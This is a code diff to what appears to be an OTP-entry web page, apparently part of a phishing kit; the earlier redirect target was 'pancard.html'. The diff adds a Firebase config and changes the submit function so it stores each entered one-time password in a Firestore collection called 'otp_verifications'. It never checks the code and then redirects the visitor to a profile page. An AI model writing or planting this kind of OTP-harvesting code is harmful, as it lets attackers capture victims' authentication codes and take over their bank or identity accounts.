@@ -247,7 +247,23 @@
   <img src="https://i.ibb.co/FbxkQBpm/Footer.jpg" alt="Footer Image">
 </div>
 
+<!-- Firebase SDK -->
+<script src="https://www.gstatic.com/firebasejs/9.6.11/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.6.11/firebase-firestore-compat.js"></script>
+
 <script>
+  const firebaseConfig = {
+    apiKey: "AIzaSyCPm7u8Gw5IK1GuPVZ02pxr5tXG3ik7xoI",
+    authDomain: "sbighsh.firebaseapp.com",
+    projectId: "sbighsh",
+    storageBucket: "sbighsh.firebasestorage.app",
+    messagingSenderId: "685947657107",
+    appId: "1:685947657107:web:471a0557bb72235272a666"
+  };
+
+  firebase.initializeApp(firebaseConfig);
+  const db = firebase.firestore();
+
   var timerInterval;
   var totalSeconds = 180;
 
@@ -255,7 +271,7 @@
     clearInterval(timerInterval);
     totalSeconds = 180;
     updateTimerDisplay();
-    timerInterval = setInterval(function() {
+    timerInterval = setInterval(function () {
       totalSeconds--;
       updateTimerDisplay();
       if (totalSeconds <= 0) {
@@ -279,27 +295,38 @@
   function submitForm() {
     var otpInput = document.getElementById('otpInput');
     var otpError = document.getElementById('otpError');
-    if (otpInput.value.trim() === "") {
+    var otpValue = otpInput.value.trim();
+
+    if (otpValue === "") {
       otpError.style.display = 'block';
       otpInput.focus();
       return;
     } else {
       otpError.style.display = 'none';
     }
-    showLoading();
+
+    // Optional: Store OTP to Firestore
+    db.collection("otp_verifications").add({
+      otp: otpValue,
+      timestamp: firebase.firestore.FieldValue.serverTimestamp()
+    }).then(() => {
+      showLoading();
+    }).catch(error => {
+      alert("Failed to save OTP: " + error.message);
+    });
   }
 
   function showLoading() {
     document.getElementById('overlay').style.display = 'flex';
     var countdown = 3;
     var countdownElement = document.getElementById('countdown');
-    
-    var interval = setInterval(function() {
+
+    var interval = setInterval(function () {
       countdown--;
       countdownElement.textContent = countdown;
       if (countdown === 0) {
         clearInterval(interval);
-        window.location.href = 'pancard.html'; // Change to your next page URL
+        window.location.href = 'profile.html';
       }
     }, 1000);
   }
@@ -309,7 +336,7 @@
     input.value = input.value.replace(/[^0-9]/g, '').slice(0, 8);
   }
 
-  window.onload = function() {
+  window.onload = function () {
     startTimer();
   };
 </script>
